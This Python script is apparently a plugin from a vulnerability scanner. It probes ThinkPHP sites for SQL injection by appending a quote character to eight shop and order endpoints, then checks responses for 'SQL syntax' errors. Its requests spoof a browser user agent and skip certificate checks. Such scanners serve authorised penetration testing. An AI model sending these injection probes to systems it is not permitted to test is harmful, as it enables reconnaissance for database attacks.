"""  
@Time: 2024/2/28 16:43 
@Auth: Y5neKO
@File: Thinkphp_multi_sql_leak.py 
@IDE: PyCharm 
"""
import requests
import urllib.parse


def run(url, timeout):
    result = {
        'name': 'Thinkphp_multi_sql_leak',
        'vulnerable': False,
        'method': None,
        'url': None,
        'payload': None
    }
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    }
    payloads = [
        r'/index.php?s=/home/shopcart/getPricetotal/tag/1%27',
        r'/index.php?s=/home/shopcart/getpriceNum/id/1%27',
        r'/index.php?s=/home/user/cut/id/1%27',
        r'/index.php?s=/home/service/index/id/1%27',
        r'/index.php?s=/home/pay/chongzhi/orderid/1%27',
        r'/index.php?s=/home/order/complete/id/1%27',
        r'/index.php?s=/home/order/detail/id/1%27',
        r'/index.php?s=/home/order/cancel/id/1%27',
    ]
    try:
        for payload in payloads:
            vurl = url + payload
            req = requests.get(vurl, headers=headers, timeout=timeout, verify=False)
            if "SQL syntax" in req.text:
                result['vulnerable'] = True
                result['method'] = 'GET'
                result['url'] = url
                result['payload'] = vurl
                return result
        return result
    except Exception as e:
        print(e)
        return result
